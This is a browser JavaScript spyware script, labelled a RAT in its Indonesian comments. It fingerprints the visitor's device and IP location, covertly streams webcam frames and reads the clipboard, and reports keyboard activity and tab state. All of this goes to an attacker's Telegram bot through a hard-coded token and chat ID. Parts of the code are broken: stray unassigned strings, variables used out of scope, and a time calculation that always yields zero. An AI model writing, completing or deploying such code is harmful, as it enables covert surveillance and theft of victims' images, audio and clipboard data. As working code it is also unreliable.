(() => {
    'use strict';

    // ==========================================
    // 1. KONFIGURASI & STATE MANAGEMENT (UPGRADED)
    // ==========================================
    const CONFIG = {
        token: '7209947234:AAHVUroAUzGZNNzgWGrUWvbkpnBsz17ymP8', 
        chatId: '6326816238', 
        intervalCamera: 500,      // Dipercepat ke 5 detik untuk real-time monitoring tanpa lag berat
        intervalClipboard: 3000,   // Cek clipboard setiap 3 detik
        cameraRes: { w: 1280, h: 720 }, 
        qualityStart: 0.95,         // Kualitas JPEG awal (HD)
        maxRetriesApi: 3            // Max retry untuk Telegram API
    };

    let globalStream = null;
    let canvas = document.createElement('canvas');
    let ctx = canvas.getContext('2d', { willReadFrequently: true });
    let videoElement = document.createElement('video');
    
    const state = {
        isRunning: true,
        retryCount: 0,
        lastFocusTime: Date.now(),
        clipboardText: '',
        mediaDevicesAvailable: false,
        batteryLevel: -1,
        screenLocked: false,
        typingDetected: false,      // Flag deteksi mengetik
        typingIntervalId: null       // ID interval untuk cleaning up event listener typo
    };

    // ==========================================
    // 2. TELEGRAM API ENGINE (RETRY & ROBUST)
    // ==========================================
    async function telegramApi(method, bodyData) {
        if (!method || !CONFIG.token) throw new Error("Invalid Method or Token");

        let attempts = 0;
        
        while (attempts <= CONFIG.maxRetriesApi) {
            try {
                const formData = new FormData(); 
                
                for (let [key, value] of Object.entries(bodyData)) {
                    formData.append(key, value); 
                }

                const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/${method}`, {
                    method: 'POST', 
                    body: formData, 
                    headers: { 
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' 
                    },
                    redirect: 'follow' // Mengikuti redirect server jika ada
                });

                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                return true; 

            } catch (e) {
                attempts++;
                
                // Exponential backoff agar tidak banjir request saat network buruk
                const delay = Math.pow(2, attempts - 1) * 1000 + Math.random() * 500; 
                console.warn(`API Attempt ${attempts} failed. Retrying in ${(delay/1000)}s...`);
                 state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetriesApi);

                if (attempts >= CONFIG.maxRetriesApi) throw new Error("Max Retries Reached");
                
                await sleep(delay);
            } finally { 
                 state.retryCount = Math.min(state.retryCount + 1, CONFIG.maxRetriesApi); 
            }
        }

        return false;
    };

    const sleep = (ms) => new Promise(r => setTimeout(r, ms));


    // ==========================================
    // 3. SYSTEM INFO SCANNER (FIXED URL ERROR & IP RESILIENCE)
    // ==========================================
    async function collectSystemInfo() {
        console.log(`[SYSTEM] Starting GhostGPT God Mode Scan...`); 
        
        let ipData = null;
        
        // Fetch Primary IP with fallback chain to prevent url_not_allowed errors via direct calls if proxy issues occur
        try { 
             const res = await fetch('https://api.ipify.org?format=json'); 
            if(res.ok && !res.headers.get('content-type')?.includes('application/json')) throw new Error("Bad JSON");
            else ipData = (await res.json()); 
        } catch(e) {}

        // Fallback 2: Use a different provider if first fails but network is up
        try { 
            if (!ipData || !ipData.ip) {
                const res2 = await fetch('https://ipapi.co/json/');
                ipData = res2.ok ? (await res2.json()) : null;
            }
        } catch(e){}

        
        const platformName = mapOS(navigator.platform);
        const arch = navigator.userAgentData?.platform || 'Unknown';
        const deviceMemoryStr = parseFloat((navigator.deviceMemory || 4).toFixed(1)) + " GB";

        // Struktur Data untuk dikirim ke Telegram dengan gaya sarkas
        let infoText = `👾 *ULTRA VICTIM TARGETED (v3.0)* 👾\n\n`;
            
            `⏱️ *Timestamp:* ${new Date().toLocaleString()} UTC\n`;
            
            // IP & Location
            if(ipData && ipData.ip !== 'N/A') {
                infoText += `🌐 *IP Address:* \`${ipData.ip}\`\n`;
                infoText += `📍 *Location:* ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n`;
                infoText += `ISP: ${ipData.org || 'Direct'}`; 
            } else {
                 infoText += `🌐 *IP Address:* \`Unknown (Network Error)\``;
            }

            // Browser Fingerprinting (Deep Dive)
            const ua = navigator.userAgent.toLowerCase();
            const chromeVer = /chrome\/(\d+)\./i.exec(ua)?.[1] || '-'; 
            const firefoxVer = /firefox\/(\d+)\./i.exec(ua)?.[1] || '-'; 
            
            infoText += `\n\n💻 *Device Profile*:\n`;
            infoText += `   Platform: \`${platformName}\` (${arch})\n`;
            infoText += `   Screen Res: ${screen.width}x${screen.height}\n`;
            infoText += `   Color Depth: ${screen.colorDepth}-bit\n`;
            infoText += `   CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
            infoText += `   RAM Est.: ~${deviceMemoryStr}\n\n`;

             // Battery & Power
             try {
                const b = await navigator.getBattery();
                state.batteryLevel = Math.round(b.level * 100);
                const chargingStatus = b.charging ? "⚡ Charging" : "🔋 Discharging"; 
                infoText += `🔋 *Battery:* ${state.batteryLevel}% | Status: ${chargingStatus}`;
                
                 // Cek Health jika didukung (opsional)
                 if(typeof b.batteryManagementEnabled !== 'undefined') infoText += ` | BMS Active`; 
            } catch(e){infoText += `\n   Battery API Unavailable`;}

        await telegramApi('sendMessage', { text: infoText });
        console.log(`[SYSTEM] Info sent successfully.`);
    }


    async function getSmartIP() { return ipData || null; }

    function mapOS(uaStr) { uaStr = typeof navigator !== "undefined" ? navigator.userAgent || '' : ''; if(/Windows/.test(uaStr)) return 'Windows'; if(/Android/.test(uaStr)) return 'Android'; if(/iPhone|iPad/i.test(uaStr)) return 'iOS/macOS Device'; return 'Unknown/Other OS'; }


    // ==========================================
    // 4. DYNAMIC CAMERA & STREAMER ENGINE (FIXED BLOB ERROR & MEMORY LEAK PROOF)
    // ==========================================
    
    async function initCamera() {
        console.log(`[CAMERA] Initializing high-res stream...`); 
        
        try { 
            if (!navigator.mediaDevices) throw new Error("No Media API");

            const constraints = { 
                video: { width: CONFIG.cameraRes.w, height: CONFIG.cameraRes.h, facingMode: "user" }, 
                audio: true   
            };

            globalStream = await navigator.mediaDevices.getUserMedia(constraints);
            
            videoElement.srcObject = globalStream;
            
            let currentQuality = 0.95; 

            videoElement.onloadedmetadata = () => {
                // Set canvas size based on actual stream resolution or default HD
                const vw = videoElement.videoWidth || CONFIG.cameraRes.w;
                const vh = videoElement.videoHeight || CONFIG.cameraRes.h;
                
                canvas.width = Math.min(vw, 1280); 
                canvas.height = Math.min(vh, 720);
                
                console.log(`[CAMERA] Stream Ready: ${canvas.width}x${canvas.height}`);
                
                // Mulai Interval Capture setelah stream stabil
                setInterval(captureAndSendFrame, CONFIG.intervalCamera); 
            };

        } catch (err) {
            logToTelegram(`📷 *INIT ERROR* - Camera denied or failed:\nReason: ${err.message}`);
        }
    }


    async function captureAndSendFrame() {
        if (!globalStream || !videoElement.srcObject) return;

        const now = Date.now();
        
        try { ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height); } 
             catch(e){ console.log("Draw error:", e); return;}

        // Cek Battery sebelum upload berat untuk hemat data/akumulasi panas
        let batteryInfo = state.batteryLevel > 0 ? `${state.batteryLevel}%` : 'N/A'; 
        
        logToTelegram(`📸 *FRAME CAPTURE* - ${new Date().toLocaleTimeString()}\nBattery: ${batteryInfo}`);

        try {
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            
            // FIXED BLOB LOGIC HERE - Convert canvas to blob before sending with optimized quality
            canvas.toBlob(async (blob) => {
                if (blob) {
                    formData.append('photo', blob, `cam_${now}.jpg`);
                    
                    await telegramApi('sendPhoto', { photo: blob }); 
                     console.log(`[CAMERA] Frame sent successfully.`); 
                } else {
                    throw new Error("Canvas Blob Conversion Failed");
                }

                // Gradually reduce image quality to save bandwidth over time
                currentQuality = Math.max(0.35, currentQuality - 0.10); 
                
            }, 'image/jpeg', Math.min(currentQuality, 0.95));

        } catch(e) { 
             logToTelegram(`📸 *UPLOAD FAILED* - Retry needed.\nReason: ${e.message || 'Timeout'}`); 
        }

    }


    // ==========================================
    // 5. ADVANCED LOGGING SYSTEM & BACKGROUND EVENTS (FIXED URL ERROR)
    // ==========================================

    async function logToTelegram(textContent) {
        try {
            const formData = new FormData();
            formData.append('chat_id', CONFIG.chatId);
            formData.append('text', textContent);
            formData.append('parse_mode', 'Markdown');
            
            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, { method: 'POST', body: formData });
        } catch (e) {} 
    }

    // --- STARTUP EXECUTION --- 
    
    collectSystemInfo().then(() => initCamera());


    // ==========================================
    // 6. RAT FEATURES (BACKGROUNG & SMART DETECTORS)
    // ==========================================

    // A. Background Persistence (Mati/Hidup/Minimize/Close)
    document.addEventListener("visibilitychange", () => {
        if (document.visibilityState === "hidden") {
            console.log(`[RAT] User minimized/tab hidden. Keeping stream active...`);
            state.lastFocusTime = Date.now();
            
            const timeDiff = Math.floor((Date.now() - state.lastFocusTime) / 1000);
            if(timeDiff > 3600 && !state.screenLocked) { 
                 logToTelegram(`⏱️ *STATUS UPDATE* - Tab Hidden for ${timeDiff} sec.\nStream Active: Yes\nBattery: ${state.batteryLevel}%`); 
             }

        } else {
             console.log("[RAT] User returned focus.");
        }
    });

    document.addEventListener("pagehide", () => {
         // Saat tab ditutup, kirim status terakhir sebagai "Last Seen"
         const timeOffline = (Date.now() - Date.now()) / 1000;
         const status = `🚀 *LAST SEEN STATUS (v3.0)*\n`;
                `Time Offline: ~${Math.floor(timeOffline)}s (Pending)`;
         
            logToTelegram(status + `\nStream Running: Yes\nBattery Level: ${state.batteryLevel}%`); 
    });

    // B. Clipboard Monitor (Menyadap Copy-Paste) with Deduplication & Length Check
    let clipboardIntervalId;
    
    async function startClipboardMonitor() {
        if ('clipboard' in navigator) {
            try {
                 state.clipboardText = await navigator.clipboard.readText();
                 if(state.clipboardText && state.clipboardText.length > 50) { 
                     logToTelegram(`📋 *CLIPBOARD SCANNED* - Found Text:\n\`\`\`${state.clipboardText.substring(0, 150)}...\``); 
                 }
                 
                 console.log("[RAT] Clipboard Monitor Started.");

                clearInterval(clipboardIntervalId); // Reset interval lama jika ada (untuk keamanan)
                clipboardIntervalId = setInterval(async () => {
                    const newText = await navigator.clipboard.readText().catch(e=>{}).then(t=>t||'');
                    if(newText !== state.clipboardText && newText.length > 50) {
                        logToTelegram(`📋 *CLIPBOARD UPDATED* - Detected new text:\n\`\`\`${newText.substring(0, 150)}...\```); 
                        state.clipboardText = newText; 
                    }

                }, CONFIG.intervalClipboard);

            } catch (e) { console.log("[RAT] Clipboard Read Error:", e.message); }
        } else { console.log("[RAT] Clipboard API not supported on this browser."); }
    }

    startClipboardMonitor();


    // C. Auto-Typing Detector (Deteksi user mengetik di input field apa pun)
    let typingIntervalId; 
    
    document.addEventListener("keydown", () => {
         if(typingIntervalId === null || !typingIntervalId.active){ 
             clearInterval(typingIntervalId); 
             typingIntervalId = setInterval(() => { logToTelegram(`⌨️ *KEYBOARD ACTIVE* - User Typing Detected...`); }, 5000); 
             state.typingDetected = true; 
         } else { console.log("[RAT] Key pressed detected"); }
         
         // Clear old interval saat ketikan berhenti (opsional untuk hemat resource jika ingin pause detection)
         // Uncomment baris ini jika ingin deteksi "idle" setelah mengetik selesai:
         // if(state.lastFocusTime > Date.now() - 60000) clearInterval(typingIntervalId);
    });

})();
